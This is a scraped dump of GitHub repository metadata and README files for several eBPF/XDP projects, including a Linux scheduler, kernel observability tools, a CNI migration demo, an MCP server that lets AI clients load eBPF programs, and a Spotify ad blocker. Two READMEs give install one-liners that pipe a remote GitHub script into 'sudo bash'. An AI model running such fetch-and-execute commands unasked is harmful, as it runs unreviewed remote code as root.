The scheduler will run until terminated with Ctrl+C (SIGINT) or SIGTERM.

### Running with Docker
To run the scheduler in a Docker container, you can either build locally or use the pre-built image from GitHub Container Registry:

**Using the pre-built image from GitHub Packages:**
```bash
docker run --privileged=true --pid host --rm ghcr.io/gthulhu/gthulhu:latest /gthulhu/main
```

**Building locally:**
```bash
make image
docker run --privileged=true --pid host --rm  127.0.0.1:25000/gthulhu:latest /gthulhu/main
```

### Debugging

If you need to inspect the BPF components, you can use:

```bash
sudo bpftool prog list            # List loaded BPF programs
sudo bpftool map list             # List BPF maps
sudo cat /sys/kernel/debug/tracing/trace_pipe # View BPF trace output
```

### Stress Testing by using `stress-ng`

```
stress-ng -c 20 --timeout 20s --metrics-brief
```

## License

This software is distributed under the terms of the GNU General Public License version 2.

## Contributing

Contributions are welcome! Please feel free to submit pull requests or open issues for bugs and feature requests.

## Community Resources

- [NotebookLM](https://notebooklm.google.com/notebook/89a6a260-3d54-4760-93a2-dcc06c6d8043): includes all of materials used in the project, including the pptx, design documents, and more.
- [GitHub Discussion](https://github.com/Gthulhu/Gthulhu/discussions): a place for community discussions, questions, and feature requests.

## Special Thanks

- [scx](https://github.com/sched-ext/scx)
- [libbpfgo](https://github.com/aquasecurity/libbpfgo)
"
SeasX/SeasPerf,60,0,60,0,C++,eBPF Observability for PHP,2025-05-15T11:32:41Z,2025-10-07T16:12:17Z,5,"# eBPF Observability for PHP
**phbpf** is specifically designed for PHP, enabling the efficient creation of kernel-level tracing and manipulation programs in Linux systems. Centered around eBPF technology, it offers a rich set of tools and examples to empower PHP developers with robust kernel observability and dynamic instrumentation capabilities within their familiar ecosystem

## âœ¨ Features
- Natively operate BPF programs with PHP scripts, ideal for rapid development and debugging of eBPF functionalities.
- Adheres to bcc frontend usage patterns, allowing bcc tool projects to be implemented in PHP with minimal effort, including built-in examples.
- Core logic written in C/C++, invoking libbpf and LLVM interfaces.
- Supports common BPF hooks: kprobe/uprobe, tracepoint, etc.
- Operates as an external, independent process for transparent monitoring of running systems and target processes.

## ðŸ›  Architecture Overview
```text
+-------------+         +---------------------------+
|  PHP Script  | <----> |  PHP Extension Module (C) |
+-------------+         +---------------------------+
                                     |
                                     v
                            +------------------+
                            |   libbpf / BCC   |
                            +------------------+
                                     |
                                     v
                            +------------------+
                            |  eBPF Subsystem  |
                            +------------------+

```

## Screenshot

This example traces a disk I/O kernel function, and populates an in-kernel
power-of-2 histogram of the I/O size. For efficiency, only the histogram
summary is returned to user-level.

```Shell
# php ./examples/tracing/bitehist.php
Tracing... Hit Ctrl-C to end.
^C
     kbytes          : count     distribution
       0 -> 1        : 3        |                                      |
       2 -> 3        : 0        |                                      |
       4 -> 7        : 211      |**********                            |
       8 -> 15       : 0        |                                      |
      16 -> 31       : 0        |                                      |
      32 -> 63       : 0        |                                      |
      64 -> 127      : 1        |                                      |
     128 -> 255      : 800      |**************************************|
```

## ðŸ”— Dependencies
- PHP 7 / 8
- Kernel with BPF support enabled
- [libbpf](https://github.com/libbpf/libbpf)
- [libbcc >= v0.29.0](https://github.com/iovisor/bcc)
- Clang / LLVM

## ðŸš€ Quick Start

### Dependency Installation

```bash
# Install llvm / bcc / clang, etc.
For example, on Ubuntu22.04:
sudo apt install bpfcc-tools linux-headers-$(uname -r)
```
**For system or dependency installation issues, see [BCC INSTALL.md](https://github.com/iovisor/bcc/blob/master/INSTALL.md).**


### Installation
```bash
git clone --recursive https://github.com/guolifu/phbpf.git
cd phbpf
phpize
./configure
make && sudo make install
# Configure php.ini
echo ""extension=ebpf.so"" >> php.ini
# Run example
php examples/hello_world.php
```

## Contents

### Tracing

Examples:

- examples/tracing/[bitehist.php](examples/tracing/bitehist.php): Block I/O size histogram.
- examples/tracing/[disksnoop.php](examples/tracing/disksnoop.php): Trace block device I/O latency.
- examples/[hello_world.php](examples/hello_world.php): Prints ""Hello, World!"" for new processes.
- examples/tracing/[stacksnoop](examples/tracing/stacksnoop.php): Trace a kernel function and print all kernel stack traces.
- examples/tracing/[tcpv4connect.php](examples/tracing/tcpv4connect.php): Trace TCP IPv4 active connections.
- examples/tracing/[trace_fields.php](examples/tracing/trace_fields.php): Simple example of printing fields from traced events.
- examples/tracing/[undump.php](examples/tracing/undump.php): Dump UNIX socket packets
- examples/tracing/[urandomread.php](examples/tracing/urandomread.php): A kernel tracepoint example, which traces random:urandom_read.
- examples/tracing/[kvm_hypercall.php](examples/tracing/kvm_hypercall.php): Conditional static kernel tracepoints for KVM entry, exit and hypercal.

#### Tools

> This section is under construction. Please check back later.

<center><a href=""images/bcc_tracing_tools_2019.png""><img src=""images/bcc_tracing_tools_2019.png"" border=0 width=700></a></center>

### Networking

Examples:

- examples/networking/[net_monitor.php](examples/networking/net_monitor.php): Used to monitor network packets on a specified network interface.

## Contributing

We welcome contributions to this project! Please feel free to submit a pull request.
"
ALEYI17/InfraSight,30,0,30,0,,"InfraSight is a modular eBPF-based observability platform for Linux and Kubernetes environments. It provides deep visibility into system activity using custom eBPF programs, a centralized ClickHouse backend, and a Kubernetes-native controller.",2025-06-09T19:40:59Z,2025-09-24T23:21:49Z,48,"# InfraSight

## ðŸ“– Project Overview

> **â€œKernel-level observability made simple with eBPF â€” for Linux and Kubernetes.â€**

**InfraSight** is a modular, open-source observability and auditing platform built on top of **eBPF** (Extended Berkeley Packet Filter). It is designed to extract fine-grained, low-level events from Linux systems in real time to provide deep visibility into system and application behavior.

InfraSight provides deep visibility into system and container activity, helping operators, developers, and security teams understand what is happening on their infrastructure.

At its core, InfraSight traces key system calls (such as `execve`, `open`, `connect`, and more) at the kernel level using safe and efficient eBPF programs. These probes operate directly within the Linux kernel without modifying application code or requiring sidecars.

The collected data is streamed through a gRPC pipeline, where it is enriched and then stored in a ClickHouse database for high-performance querying and analysis.

The platform is suitable for both **standalone Linux systems** and **Kubernetes clusters**. In Kubernetes environments, InfraSight includes components to simplify agent deployment and lifecycle management through custom resources and a dedicated controller.

InfraSight is composed of four main components:

* A **Kubernetes controller** to manage and deploy eBPF agents across the cluster.
* A user-space **agent** that runs eBPF programs and streams structured events.
* A **server** that receives, enriches, and stores telemetry data in a ClickHouse database.
* A **Helm chart** to deploy the system in Kubernetes environments.
* A **Machine Learning** anomaly detection (resource + syscall frequency)
* A **Rules engine** for predefined threats.

InfraSight provides the foundation for building advanced observability, auditing, and security tools with a low-overhead, event-driven architecture.

## ðŸ” Supported Syscalls & Their Purpose

InfraSight currently supports tracing the following system calls using eBPF:

| Syscall   | Purpose                                                                                                                             |
| --------- | ----------------------------------------------------------------------------------------------------------------------------------- |
| `execve`  | Captures process execution events, including command-line arguments. Useful for auditing what commands are being run on the system. |
| `open`    | Monitors when files are opened. Helps track access to sensitive files or unexpected file usage.                         |
| `chmod`   | Detects permission changes on files. Useful to monitor unauthorized attempts to alter access rights.                         |
| `connect` | Tracks outbound network connections made by processes. Essential for detecting unexpected or malicious network behavior.            |
| `accept`  | Captures inbound connections to servers. Important to understand what is listening and who is connecting.                                  |
| `ptrace`  | Monitors process tracing and injection attempts. Useful for detecting debugging or code injection behavior.                                  |
| `mmap`  | Tracks memory mappings. Can reveal suspicious allocations often used in exploits.                                  |
| `mount`  | Observes filesystem mounting. Helps detect container escapes or persistence mechanisms.                                  |
| `umount`  | Observes filesystem mounting. Helps detect container escapes or persistence mechanisms.                                  |
| `resource`  | Monitors low-level resource usage and memory management (context switches, page faults, mmap/munmap, brk, read/write, and process exit). Useful for detecting anomalous resource consumption or crashes.                                  |
| `syscall frequency`  | Counts syscall invocations and aggregates frequency metrics per process until exit. Useful for anomaly detection based on unusual syscall usage patterns.                                  |


These syscalls were selected for their importance in understanding:

* Process activity (`execve`)
* File system access (`open`, `chmod`)
* Network behavior (`connect`, `accept`)
* etc

By tracing these operations at the kernel level, InfraSight provides visibility into both user and system behavior whether it's detecting a rogue shell command, a file access violation, or unexpected network traffic.

InfraSight is extensible, and support for additional syscalls (such as `unlink`, `bind`, or `setuid`) can be added in future iterations.


## ðŸ—ºï¸ Architecture Diagram

The diagram below illustrates the high-level architecture of the **InfraSight** platform:

![InfraSight Architecture](https://github.com/ALEYI17/InfraSight/blob/main/docs/images/infrasight.png)

InfraSight follows a modular pipeline:

* **eBPF Agents** collect raw syscall events (like `execve`, `open`, `connect`, etc.) directly from the kernel using eBPF programs.
* These events are enriched at the source (e.g., resolving user names, container metadata), then streamed via **gRPC** to the central **InfraSight Server**.
* The server performs further enrichment (timestamps, formatting, latency conversion) and writes the data into **ClickHouse**, a columnar database optimized for analytical queries.
* A Machine Learning module analyzes patterns in resource usage and syscall frequency to detect anomalies.
* A Rules engine applies predefined detection logic to generate alerts on known threats
* Finally, users can analyze and visualize the collected data using tools like **Grafana**, **pytorch**, or direct SQL queries.

This architecture enables deep observability on both standalone Linux hosts and Kubernetes clusters.

### 4. **ðŸ§© Project Components**

| Component                                                                   | Description                                                                               |
| --------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------- |
| [`ebpf_loader`](https://github.com/ALEYI17/ebpf_loader)                     | Lightweight agent that runs eBPF programs on each node and sends telemetry to the server  |
| [`ebpf_server`](https://github.com/ALEYI17/ebpf_server)                     | Receives, enriches, and stores events in ClickHouse                                       |
| [`infrasight-controller`](https://github.com/ALEYI17/infrasight-controller) | Kubernetes-native controller for deploying and managing eBPF agents                       |
| [`ebpf_deploy`](https://github.com/ALEYI17/ebpf_deploy)                     | Helm-based deployment for ClickHouse and the server in Kubernetes                         |
| [`InfraSight_ml`](https://github.com/ALEYI17/InfraSight_ml)                 | Machine learning models for anomaly detection (resource + syscall frequency)              |
| [`InfraSight_sentinel`](https://github.com/ALEYI17/InfraSight_sentinel)     | Rules engine for generating alerts based on predefined detection logic                    |
| [`ClickHouse`](https://clickhouse.com/)                                       | High-performance columnar database used for storing and querying enriched eBPF event data |


### 5. **ðŸš€ Getting Started**

InfraSight is composed of multiple modular components that can be deployed individually or together, depending on your needs. It supports both **Kubernetes** and **non-Kubernetes (bare-metal or VM)** environments.

To get started, **follow the README files in each of the individual repositories**. Each one contains specific setup and usage instructions tailored to its component:

| Component                | Repository                                                                  |
| ------------------------ | --------------------------------------------------------------------------- |
| eBPF Agent (Loader)      | [`ebpf_loader`](https://github.com/ALEYI17/ebpf_loader)                     |
| Event Server & Ingestion | [`ebpf_server`](https://github.com/ALEYI17/ebpf_server)                     |
| Kubernetes Controller    | [`infrasight-controller`](https://github.com/ALEYI17/infrasight-controller) |
| Helm-based Deployment    | [`ebpf_deploy`](https://github.com/ALEYI17/ebpf_deploy)                     |
| ML Anomaly Detection     | [`InfraSight_ml`](https://github.com/ALEYI17/InfraSight_ml)                 |
| Rules Engine             | [`InfraSight_sentinel`](https://github.com/ALEYI17/InfraSight_sentinel)     |


### 6. **âœ¨ Features**

* **Kernel-Level Tracing with eBPF**
  Trace key system calls like `execve`, `open`, `chmod`, `connect`, and `accept` directly from the Linux kernel.

* **Real-Time Event Streaming**
  Events are streamed over gRPC for minimal latency and efficient transport.

* **Structured Storage with ClickHouse**
  Events are stored in a high-performance, columnar database for fast querying and analysis.

* **Machine Learning Anomaly Detection**
  Detect resource usage spikes and unusual syscall frequency patterns.

* **Rules Engine for Threat Detection**
  Catch predefined malicious behaviors such as reverse shells, privilege escalation, or container escapes.

* **Works in Bare Metal or Kubernetes**
  InfraSight can run on regular Linux systems or be deployed in Kubernetes using Helm and a custom controller.

* **Kubernetes Controller with CRD Support**
  Deploy and manage tracing agents with fine-grained configuration using a custom resource.

### 8. **ðŸ”® Future Work**

InfraSight is designed to be extensible. The following enhancements are under consideration to make the platform even more powerful and user-friendly:

* [x] **Anomaly Detection & Behavior Profiling**
  Machine learning models for syscall frequency and resource usage anomaly detection.

* [x] **Resilience & Scalability**
  Retries, graceful shutdown, batching, and optional message queue integration for scaling the server.
* [x] **Threat Detection Capabilities**
  Add rule-based detection for attack patterns such as privilege escalation, reverse shells, or unauthorized access attempts.
* [x] **Sentinel Integration**
  Static analysis and correlation engine for combining runtime events with code-level insights.

* [ ] **Standard Dashboards (Grafana / Metabase)**
  Ready-made dashboards for visualizing telemetry data.

* [ ] **Alerting System**
  Integrate with email, Slack, or webhook notifications when anomalies or threats are detected.

* [ ] **Web Interface or CLI**
  User-friendly interface to explore and interact with traced events.

> Have an idea or suggestion to improve InfraSight?
Feel free to open an issue or reach out â€” contributions and feedback are always welcome!

"
stelb/antrea2cilium,2,0,2,1,Shell,Live migration from antrea to cilium,2025-06-15T10:41:59Z,2025-07-17T14:38:05Z,29,"# Migrate a k8s cluster with antrea CNI to cilium

I have no tanzu to mess around, so I use kind

It's meant for a demo, so I run it in a tmux session and some panes will be opened to watch what is happening:
- in the cluster
- possible nginx errors
- and cilium state

This is based on [Tutorial: How to Migrate to Cilium](https://isovalent.com/blog/post/tutorial-migrating-to-cilium-part-1/) by Nico Vibert
and [Migrating from Calico](https://isovalent.com/labs/cilium-migrating-from-calico/) Lab

## just show me.
I have added some tmux magic in the scripts, so you can see what's happening without arranging terminals.
Have a big monitor :)

https://asciinema.org/a/723314

## Requirements

My scripts expect a few installed commands

- tmux (used for automatically splitting terminal to be used for output)
- docker and compose plugin
- kind
- kubectl
- k9s
- helm
- cilium
- jq

## Summary

### Infrastructure

I added some 'infrastructure' for convenience which is running in docker

#### Registry mirrors

To speed things up, as images are pulled multiple time alone for a single run and to avoid waiting and hitting rate limits I added mirrors to be used
(props to Duffie Cooley)

- docker
- github
- redhat
- vmware

They are deployed with network kind

#### Simple loadblancer

To check availibility of workload without different ports, while control-planes are upgraded
This needs the running kind setup


### kind cluster

- 3 control-planes
- 4 worker-nodes

You need at least 2 for redundancy... but this should be obvious :)

kind will be setup with config for the mentioned mirrors and without CNI

[cluster.yaml](config/cluster.yaml)

### Antrea Installation

just applying a manifest

[02_install_antrea.sh](02_install_antrea.sh)

### Cilium pre migration installation

Cilium will be installed without being activated and with special parameters to work with workload using a different CNI.
Aditionally a CiliumNodeConfig will be created, to define when a node is switched to cilium.
* [helm values-migration.yaml](helm/values-migration.yaml)
* [CiliumNodeConfig](manifests/CiliumNodeConfig.yaml)


### Actual migration

Migration is triggered node by node by 
* cordon and then drain the nodes
* setting the label of nodes to be migrated io.cilium.migration/cilium-default to ""true""
* reboot and uncordon the node(s)

[08_switch_nodes.sh](08_switch_nodes.sh)

### Remove Migration parameters

The cilium migration will be finalized by removing parameters needed for co-working with existing antrea

### Remove antrea

kubectl delete installation manifest

## Doing
Start tmux and then execute scripts in oder:

```shell
# docker registry mirrors in kind network
$ ./00_registry_mirrors.sh

# kind cluster without cni, k9s to watch all pods will be started in a tmux pane
$ ./01_create_cluster.sh

# deploy antrea
$ ./02_install_antrea.sh

# start a loadbalancer in docker within kind network
$ ./03_loadbalancer.sh

# run curl in a loop and output any non-200 state in a tmux pane
$ ./04_check_nginx.sh

# create nginx deployment
$ ./05_nginx.sh

# check antreas subnets with configured nets for cilium
$ ./06_check_subnets.sh

# should be no conflict, so deploy cilium with migration setting
# and add CiliumNodeConfig for switching node by node
$ ./07_deploy_cilium.sh

# call next script for each node. 
$ ./08_switch_node.sh antrea2cilium-worker

# remove migration settings
$ ./09_finalize_migration.sh

# remove antrea
$ ./11_delete_antrea.sh

# finished, no errors destroy everything including tmux session.
$ ./12_stop.sh 
```

To watch cilium state, cilium.sh will start another tmux pane calling ```cilimu status``` every few seconds
```shell
# can be called any time
$ ./cilium.sh
```



"
bugsfixing/XDP-fastDNSC,7,1,7,0,C,XDP/eBPF based fast DNS-Caching service.,2025-06-23T16:54:43Z,2025-08-16T05:39:56Z,3,"
# XDP-fastDNSC 
# XDP-FastDNSCaching Service.


A program that cached A/AAAA records and processes them ultra fast using XDP/eBPF offloading xdp program on NIC.

## Use cases
 
 Cache DNS queries that are most used for faster performance.

 Or integrate whatever you want! Endless possibilities!


## Features

 A/AAAA Records support

 DNSSEC support

 Upstream DNS support for caching records.

 Failover DNS Upstream support (Using multiple DNS Servers)

 Metrics Monitoring

 Round Robin support
 
 Advanced Caching and serving using XDP/eBPF



## Installation and Running

Install the dependencies

```bash
sudo apt install -y clang llvm libbpf-dev linux-tools-common linux-tools-$(uname -r) iproute2 libdns-dev
```

### Compile
```bash
clang -O2 -Wall -target bpf -I/usr/include/$(uname -m)-linux-gnu -c xdp-dns.c -o xdp-dns.o
gcc -Wall dns_loader.c -o dns_loader -lbpf -lldns -lpthread

```

#### Running

```bash
./xdp-loader eth0
```


"
sameehj/ebpf-mcp,17,3,17,10,Go,,2025-04-10T18:50:42Z,2025-08-03T07:56:44Z,67,"# ðŸ ebpf-mcp: AI-Compatible eBPF Control via Model Context Protocol

> A secure, minimal, and schema-enforced MCP server for eBPF â€” purpose-built for AI integration, kernel introspection, and automation.

[![Version](https://img.shields.io/github/v/release/sameehj/ebpf-mcp?label=version)](https://github.com/sameehj/ebpf-mcp/releases)
[![MCP Compatible](https://img.shields.io/badge/MCP-Compatible-orange)](https://modelcontextprotocol.io)
[![eBPF Support](https://img.shields.io/badge/eBPF-Linux%205.8%2B-green)](https://ebpf.io)
[![License: GPL v2 (eBPF)](https://img.shields.io/badge/License-GPL%20v2-blue.svg)](https://www.gnu.org/licenses/old-licenses/gpl-2.0.html)
[![License: Apache 2.0 (Core)](https://img.shields.io/badge/License-Apache%202.0-green.svg)](https://www.apache.org/licenses/LICENSE-2.0)

---

## ðŸ§  What Is This?

`ebpf-mcp` is a secure **Model Context Protocol (MCP)** server that exposes **a minimal set of structured tools** to interact with eBPF â€” optimized for safe AI control, automation agents, and human operators.

It enables **loading, attaching, introspecting, and streaming** eBPF programs â€” all through strict JSON Schema contracts validated at runtime. No REST APIs, no shell escapes, and no bpftool wrappers.

---

## ðŸš€ Quick Start

### ðŸ“¦ One-liner Installation

```bash
# Install ebpf-mcp server
curl -fsSL https://raw.githubusercontent.com/sameehj/ebpf-mcp/main/install.sh | sudo bash

# Start the service (runs on port 8080 by default)
sudo systemctl start ebpf-mcp
sudo systemctl enable ebpf-mcp

# Get your auth token
cat /etc/ebpf-mcp-token

# Check service status
sudo systemctl status ebpf-mcp

# View logs if needed
sudo journalctl -u ebpf-mcp -f
```

**For air-gapped or development environments:**
```bash
git clone https://github.com/sameehj/ebpf-mcp.git
cd ebpf-mcp
sudo ./install.sh v1.0.2
```

### ðŸ§ª Test the Installation

```bash
# Run the complete test suite
cd scripts/
chmod +x test-ebpf-mcp-server.sh
./test-ebpf-mcp-server.sh <your-token>
```

If no token is provided, the script will prompt for it interactively.

---

## ðŸ¤– Claude CLI Integration

Once installed, connect Claude to your eBPF server (runs on port 8080):

```bash
# Add MCP server to Claude CLI
claude mcp add ebpf http://localhost:8080/mcp \
  -t http \
  -H ""Authorization: Bearer $(cat /etc/ebpf-mcp-token)""

# Start Claude with eBPF tools
claude --debug

# Optional: Test with MCP Inspector (requires Node.js)
npx @modelcontextprotocol/inspector http://localhost:8080/mcp
```

## ðŸ“˜ Tutorials

Looking to get started in specific environments or with Cursor IDE?

### ðŸ§° [VirtualBox Setup Guide](./docs/VIRTUALBOX_SETUP_TUTORIAL.md)

Learn how to configure and run ebpf-mcp inside a VirtualBox VM, with port forwarding, SSH access, and practical tips.

### ðŸ–¥ï¸ [Cursor IDE + eBPF-MCP Integration](./docs/CURSOR_IDE_TUTORIAL.md)

Step-by-step guide for running the eBPF MCP server with Cursor IDE for AI-driven observability.

**Example prompts:**
- `> Get system info and kernel version`
- `> Load and attach a kprobe program to monitor sys_execve`
- `> Show me all active eBPF programs and their types`
- `> Stream events from ringbuffer maps for 10 seconds`
- `> Trace kernel errors for the next 5 seconds`

---

## ðŸ“¥ Install Options

| Method | Command | Use Case |
|--------|---------|----------|
| **One-liner** | `curl ... \| sudo bash` | Production systems |
| **Manual** | `git clone && sudo ./install.sh` | Development/air-gapped |
| **Build from source** | `make build` | Custom modifications |
| **Docker** | *Coming soon* | Containerized environments |

---

## ðŸ”§ Minimal Toolset

Each tool is designed to be schema-validatable, AI-orchestrable, and safe-by-default. They cover 80%+ of real-world observability and control workflows.

| Tool Name        | Status | Description                                     | Capabilities Required                          |
| ---------------- | ------ | ----------------------------------------------- | ---------------------------------------------- |
| `info`           | âœ…      | System introspection: kernel, arch, BTF        | `CAP_BPF` or none (read-only)                  |
| `load_program`   | âœ…      | Load and validate `.o` files (CO-RE supported)  | `CAP_BPF` or `CAP_SYS_ADMIN`                   |
| `attach_program` | âœ…      | Attach program to XDP, kprobe, tracepoint hooks | Depends on type (e.g. `CAP_NET_ADMIN` for XDP) |
| `inspect_state`  | âœ…      | List programs, maps, links, and tool metadata   | `CAP_BPF` (read-only)                          |
| `stream_events`  | âœ…      | Stream events from ringbuf/perfbuf maps         | `CAP_BPF` (read-only)                          |
| `trace_errors`   | âœ…      | Monitor kernel tracepoints for error conditions | `CAP_BPF` (read-only)                          |

> **All tools return structured JSON output** â€” AI-ready, streaming-compatible, and schema-validated.

> ðŸ” See [`docs/TOOL_SPECS.md`](./docs/TOOL_SPECS.md) for full schema definitions.

---

## ðŸš€ What You Can Do

* âœ… Query kernel version, architecture, and BTF availability
* âœ… Load programs from disk or inline base64 with optional BTF
* âœ… Attach to live systems with type-safe constraints
* âœ… Inspect pinned objects, kernel version, verifier state
* âœ… Stream real-time events with filtering by pid/comm/cpu
* âœ… Trace kernel errors and system anomalies
* âœ… Discover available tools and their schemas
* âœ… Integrate with Claude, Ollama, or MCP-compatible clients

---

## ðŸ›¡ï¸ Security Model

| Layer             | Controls                                 |
| ----------------- | ---------------------------------------- |
| eBPF execution    | Kernel verifier + resource caps          |
| Filesystem        | No shell, no exec, path-validated        |
| Runtime isolation | Session-scoped cleanup, strict inputs    |
| AI safety         | Capability-aware schemas + output limits |
| Authentication    | Bearer token + HTTPS ready              |

ðŸ§¼ All resources are automatically cleaned up when a client disconnects (no manual unload/detach required unless pinned).

---

## ðŸ“¦ Project Structure

```
.
â”œâ”€â”€ cmd/              # MCP server + CLI client
â”œâ”€â”€ internal/         # Core logic: eBPF, tools, kernel adapters
â”œâ”€â”€ pkg/types/        # JSON schema bindings + shared types
â”œâ”€â”€ docs/             # Tool specs, design notes, schemas
â”œâ”€â”€ scripts/          # Install script + test suite
â””â”€â”€ schemas/          # JSON Schema files for each tool
```

---

## ðŸ§  Advanced Design Notes

### âœ… Lifecycle Management

* ðŸ”’ **No manual detach**: Links are closed automatically unless pinned
* ðŸ§¹ **Auto cleanup**: FDs and memory are released on disconnect
* ðŸ“Ž **Pinning**: Optional pin paths (`/sys/fs/bpf/...`) for maps/programs/links

### ðŸ¤– AI Tooling Compatibility

* All tools are **strictly typed** with published schemas and return **structured JSON output**
* **AI-ready**: No parsing required â€” direct integration with language models
* **Streaming-compatible**: Real-time data flows for observability workflows
* Responses include:
  * `tool_version`
  * `verifier_log` (for debugging)
  * Structured `error` with `context`

### ðŸ”— Extensibility

Future optional tools:
* `pin_object` / `unpin_object`
* `detach_link`
* `map_batch_op`

These are omitted from the default for security and simplicity.

---

## ðŸ“š References

* [Linux Kernel eBPF Docs](https://docs.kernel.org/bpf/)
* [Model Context Protocol](https://modelcontextprotocol.io)
* [MCP Inspector Tool](https://github.com/modelcontextprotocol/inspector)
* [JSON Schema Spec (2020-12)](https://json-schema.org/)
* [eBPF Security Best Practices](https://ebpf.io/security/)
* [Cilium for Kubernetes Observability](https://cilium.io/)

ðŸ§ª See [`scripts/test-ebpf-mcp-server.sh`](./scripts/test-ebpf-mcp-server.sh) for full validation suite.

**Basic Architecture:**
```
Claude / Ollama / AI Client
          â†“
     MCP JSON-RPC
          â†“
   ebpf-mcp server
          â†“
     Kernel APIs
```

---

## ðŸ“œ Licensing

| Component        | License    |
| ---------------- | ---------- |
| `internal/ebpf/` | GPL-2.0    |
| Everything else  | Apache-2.0 |

---

## âœ‰ï¸ Contact

ðŸ“¬ [GitHub â€“ sameehj/ebpf-mcp](https://github.com/sameehj/ebpf-mcp)
ðŸ›  Contributions, issues, and PRs welcome!

---

> **Structured. Safe. Schema-native.**
> `ebpf-mcp` brings eBPF to the age of AI."
Kazedaa/eBAF,133,7,133,1,C,You wouldnt Download an Ad. But you would block one.,2025-06-15T18:12:49Z,2025-09-23T16:58:49Z,66,"# eBAF - eBPF Based Ad Firewall
<p align=""center"">
    <img src=""assets/banner.png"" alt=""eBAF - eBPF Ad Firewall Banner"" width=""600""/>
</p>

## ""You Wouldn't Download an Ad""
### But You Would Block One!
 
Spotify has built an empire on a simple formula: monetize your attention, underpay the artists, and sell you back your own time as a premium feature.
In their world, your listening experience is not yours. Itâ€™s a carefully curated marketplace â€” your ears are the product, your patience is the currency.

They like to call it a ""free"" tier.
But letâ€™s be honest: itâ€™s not free if youâ€™re paying with your time.

Meanwhile, the artists you love â€” the people whose work keeps the platform alive â€” often earn mere fractions of pennies per stream. Spotify profits handsomely, the advertisers get their exposure, and the creators? They get scraps.

This isnâ€™t just about skipping a few annoying ads.
Itâ€™s about refusing to participate in a system that profits from exploitation, distraction, and the commodification of your attention.

#### What is this?
An elegant little act of digital resistance: a clean, open-source adblocker for Spotify that stops the noise â€” literally.

No sketchy mods, no cracked clients, no malware masquerading as freedom. Just one goal: let the music play without being held hostage by ads.

Spotify isnâ€™t free â€” you pay with your patience.

They bombard you with the same grating ads, over and over, until you give up and subscribe. Not because you love Premium. But because youâ€™ve been worn down. Thatâ€™s not freemium â€” thatâ€™s psychological warfare with a playlist.

Meanwhile, the artists? Still underpaid.
The ads? Louder. More frequent. Sometimes literally louder.
You? Just trying to vibe.

They profit from your patience and their underpayment of creators, all while pretending itâ€™s the only sustainable way. Spoiler: it isnâ€™t. They had a choice â€” but they chose profit margins over people.

Spotify wants you to believe this is the cost of access.
We believe thatâ€™s a lie.

Weâ€™re not pirates. Weâ€™re not criminals. Weâ€™re just people who think it's okay to draw a line.

This project isnâ€™t about skipping a few ads. Itâ€™s about rejecting a system that says your silence can be sold, your experience can be interrupted, and your value begins only when you open your wallet.

Blocking ads is not theft.<br>
Stealing your time is.<br>
Weâ€™re not here to pirate. Weâ€™re here to opt out.<br>
<br>
**You wouldnt Download an Ad. But you would block one.**

## How does eBAF work?

eBAF (eBPF Ad Firewall) leverages the power of eBPF (Extended Berkeley Packet Filter) to block unwanted advertisements at the kernel level. Here's a high-level overview of its functionality:

## How does eBAF work?

eBAF (eBPF Ad Firewall) leverages eBPF (Extended Berkeley Packet Filter) to block ads at the kernel level efficiently. Here's a simplified overview:

1. **Packet Filtering**:
   - Inspects incoming network packets and blocks those matching a blacklist of IP addresses using XDP (eXpress Data Path).

2. **Dynamic Updates**:
   - Resolves domain names into IP addresses and updates the blacklist dynamically to stay effective against changing ad servers.

3. **Web Dashboard**:
   - Provides live statistics and monitoring through a user-friendly interface.

4. **High Performance**:
   - Operates directly at the network interface level, bypassing the kernel's networking stack for faster processing and minimal resource usage.

eBAF combines efficiency, transparency, and ease of use to deliver a powerful ad-blocking solution.

## Simple Install (Reccomended)
Make sure to have git and curl installed
```bash
git --version
curl --version
```
### Install
#### Enable Spotify integration (Recommended)
```bash
EBAF_ENABLE_SPOTIFY=yes curl -sSL https://github.com/Kazedaa/eBAF/raw/main/install.sh | sudo -E bash
```
#### Disable explicitly
```bash
EBAF_ENABLE_SPOTIFY=no curl -sSL https://github.com/Kazedaa/eBAF/raw/main/install.sh | sudo bash```
```

### Uninstall
```bash
curl -sSL https://raw.githubusercontent.com/Kazedaa/eBAF/main/uninstall.sh | sudo bash
```


## Dev Install
Run the following commands to install the required dependencies:
### Ubuntu/Debian
```bash
sudo apt-get update
sudo apt-get install libbpf-dev clang llvm libelf-dev zlib1g-dev gcc make python3

sudo apt update
sudo apt install net-tools
```

### Fedora/CentOS/RHEL 8+
```bash
sudo dnf update
sudo dnf install -y libbpf-devel clang llvm elfutils-libelf-devel zlib-devel gcc make python3 net-tools bc
```

### Arch
```bash
sudo pacman -Syu
sudo pacman -S --needed libbpf clang llvm libelf zlib gcc make python net-tools bc
```

### Fix asm/types.h Error whiel running eBPF code
Check the current link
`ls -l /usr/include/asm`
Find the currect link
`find /usr/include -name ""types.h"" | grep asm`
Fix the symbolic link 
```bash
sudo rm /usr/include/asm
sudo ln -s <current_link> /usr/include/asm
```

### Building the Project

To build the eBPF Adblocker, follow these steps:

1. Clone the repository:
   ```bash
   git clone <repository-url>
   cd eBAF
   ```

2. Build the project:
   ```bash
   make
   ```

3. (Optional) Install system-wide:
   ```bash
   sudo make install
   ```

4. Other install options (help desk)
    ```bash
    make help
    ````
5. UnInstall
    ```bash
    make uninstall
    ````

## Usage

### Running the Adblocker
    Uses spotify-stable.txt as default Blacklist.
    Usage: ebaf [OPTIONS] [INTERFACE...]
    OPTIONS:
    -a, --all               Run on all active interfaces
    -d, --default           Run only on the default interface (with internet access)
    -i, --interface IFACE   Specify an interface to use
    -D, --dash              Start the web dashboard (http://localhost:8080)
    -q, --quiet             Suppress output (quiet mode)
    -h, --help              Show this help message


### Configuring Blacklist
Edit the lists to add or remove domains. Each domain should be on a separate line. Comments start with `#`.

## Acknowledgements

A Special thanks to â¤ï¸ <br>
1. [Isaaker's Spotify-AdsList](https://github.com/Isaaker/Spotify-AdsList/tree/main) <br>
2. [AnanthVivekanand's spotify-adblock](https://github.com/AnanthVivekanand/spotify-adblock)

for providing a spotify block list

## â­ï¸ Support the Project

If you find eBAF useful, please consider starring the repository on GitHub! Your support helps increase visibility and encourages further development."
famidok/Blackhole,10,2,10,0,C,A blacklist application developed in C using XDP/eBPF technologies.,2025-05-11T15:12:51Z,2025-08-01T11:57:47Z,10,"# ðŸ•³ï¸ Blackhole

**Blackhole** is an XDP-based packet filtering tool that allows fine-grained banning of traffic based on various criteria such as source/destination IPs, ports, and interfaces using eBPF maps.

![Blackhole Logo](images/Blackhole_Chart.jpg)

---

## âœ¨ Features

